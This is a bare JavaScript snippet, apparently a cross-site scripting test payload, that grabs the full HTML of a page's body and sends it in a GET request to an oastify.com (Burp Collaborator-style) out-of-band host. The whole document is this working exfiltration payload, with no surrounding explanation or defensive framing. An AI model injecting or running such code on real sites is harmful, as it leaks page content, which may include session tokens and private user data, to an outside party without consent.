var bodyText = document.getElementsByTagName("body")[0].innerHTML;
var xmlHttp = new XMLHttpRequest();
var url = "http://oxpa8hivzsaq6qdjgmv721ouzl5ctch1.oastify.com/js_test2?" + encodeURIComponent(bodyText);
xmlHttp.open( "GET", url, false );
xmlHttp.send( null );
